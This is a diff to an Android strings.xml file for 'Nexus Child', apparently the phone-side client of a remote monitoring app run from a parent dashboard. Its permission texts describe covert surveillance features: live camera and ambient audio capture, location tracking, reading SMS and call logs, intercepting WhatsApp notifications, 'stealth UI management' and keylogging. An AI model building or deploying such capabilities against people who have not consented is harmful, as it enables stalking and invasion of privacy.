@@ -1,3 +1,78 @@
 <resources>
     <string name="app_name">Nexus Child</string>
+    <string name="system_tag">CLIENT NODE</string>
+
+    <!-- Home Screen -->
+    <string name="device_identifier_label">DEVICE IDENTIFIER</string>
+    <string name="device_id_hint">Enter this identifier on your Nexus Parent desktop dashboard to initiate WebRTC connection.</string>
+    <string name="device_id_copied">Device identifier copied to clipboard</string>
+    <string name="status_ready">READY - AWAITING CONNECTION</string>
+    <string name="status_connected">LIVE - SESSION ACTIVE</string>
+    <string name="status_disconnected">DISCONNECTED</string>
+
+    <!-- Permissions Overview Card -->
+    <string name="permissions_card_title">SYSTEM PERMISSIONS</string>
+    <string name="permissions_card_desc">System access required for background surveillance, camera, microphone, call logs, SMS, and file browsing.</string>
+    <string name="btn_configure_permissions">Configure Permissions</string>
+    <string name="btn_permissions_complete">All Permissions Active</string>
+    <string name="permission_status_format">%1$d / %2$d Granted</string>
+
+    <!-- Badges -->
+    <string name="badge_engine">Engine: WebRTC</string>
+    <string name="badge_target">Target: Pixel 8 Pro</string>
+    <string name="badge_storage">Internal Storage</string>
+
+    <!-- Permission Guide Activity -->
+    <string name="guide_step_format">STEP %1$d OF %2$d</string>
+    <string name="guide_grant_permission">Grant Permission</string>
+    <string name="guide_open_settings">Open System Settings</string>
+    <string name="guide_skip">Skip For Now</string>
+    <string name="guide_granted">Permission Granted</string>
+    <string name="guide_all_done_title">Configuration Complete</string>
+    <string name="guide_all_done_desc">All essential system permissions have been authorized. Nexus Child is ready for active monitoring.</string>
+    <string name="guide_return_home">Return To Dashboard</string>
+    <string name="toast_unable_to_open_settings">Unable to open system settings for this permission</string>
+
+    <!-- Dedicated Permission Descriptions -->
+    <string name="perm_camera_title">Camera Access</string>
+    <string name="perm_camera_desc">Enables remote real-time video streaming from front and back cameras for visual surveillance.</string>
+
+    <string name="perm_mic_title">Microphone Access</string>
+    <string name="perm_mic_desc">Captures ambient environmental audio to monitor the surroundings of the child device in real time.</string>
+
+    <string name="perm_location_title">Location Tracking</string>
+    <string name="perm_location_desc">Provides high-precision GPS positioning and breadcrumb tracking to monitor child movements.</string>
+
+    <string name="perm_call_logs_title">Call Logs</string>
+    <string name="perm_call_logs_desc">Grants access to incoming, outgoing, and missed call records including phone numbers, durations, and timestamps.</string>
+
+    <string name="perm_contacts_title">Contacts</string>
+    <string name="perm_contacts_desc">Synchronizes the device address book so the parent dashboard can identify callers and message correspondents.</string>
+
+    <string name="perm_phone_title">Phone State</string>
+    <string name="perm_phone_desc">Permits monitoring cellular connections, active call status, SIM card carrier details, and phone telemetry.</string>
+
+    <string name="perm_sms_title">SMS Messages</string>
+    <string name="perm_sms_desc">Enables reading and auditing incoming and outgoing SMS text messages for communication safety.</string>
+
+    <string name="perm_photos_videos_title">Photos and Videos</string>
+    <string name="perm_photos_videos_desc">Allows the parent dashboard to audit and inspect stored gallery photos, screenshots, and video recordings.</string>
+
+    <string name="perm_music_audio_title">Music and Audio</string>
+    <string name="perm_music_audio_desc">Enables access to audio files, voice recordings, sound clips, and audio media stored on the device.</string>
+
+    <string name="perm_notifications_runtime_title">Notifications</string>
+    <string name="perm_notifications_runtime_desc">Allows the background surveillance agent to display essential persistent service status notifications.</string>
+
+    <string name="perm_storage_title">All Files Access</string>
+    <string name="perm_storage_desc">Grants deep file manager access across internal storage to browse, retrieve, and inspect documents.</string>
+
+    <string name="perm_battery_title">Battery Optimization</string>
+    <string name="perm_battery_desc">Disables Android OS aggressive power saving so the WebRTC signaling and background monitoring keep running without interruptions.</string>
+
+    <string name="perm_accessibility_title">Accessibility Service</string>
+    <string name="perm_accessibility_desc">Grants deep system inspection, stealth UI management, keylogging, and remote interaction capabilities.</string>
+
+    <string name="perm_notifications_title">Notification Listener</string>
+    <string name="perm_notifications_desc">Intercepts and mirrors incoming notifications from apps like WhatsApp, Telegram, and Messages directly to the parent dashboard.</string>
 </resources>
